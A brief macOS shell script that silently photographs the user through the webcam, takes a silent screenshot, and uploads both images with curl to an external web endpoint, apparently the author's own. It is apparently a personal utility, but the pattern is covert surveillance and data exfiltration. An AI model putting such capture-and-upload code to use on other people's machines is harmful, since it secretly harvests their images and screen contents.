#!/bin/sh

RED='\033[0;31m'
NC='\033[0m' # No Color
timestamp=$(date +%s)

# Capture camera mac
ffmpeg -f avfoundation -video_size 1280x720 -framerate 30 -i "0" -vframes 1 "/tmp/me_${timestamp}.jpg"
echo "/tmp/me_${timestamp}.jpg"

# Capture ecran mac
screencapture -x "/tmp/screen_${timestamp}.jpg"
echo "/tmp/screen_${timestamp}.jpg"

curl -F "screen=@/tmp/screen_${timestamp}.jpg" -F "me=@/tmp/me_${timestamp}.jpg" http://wp.aurelien-loyer.fr/mailer/
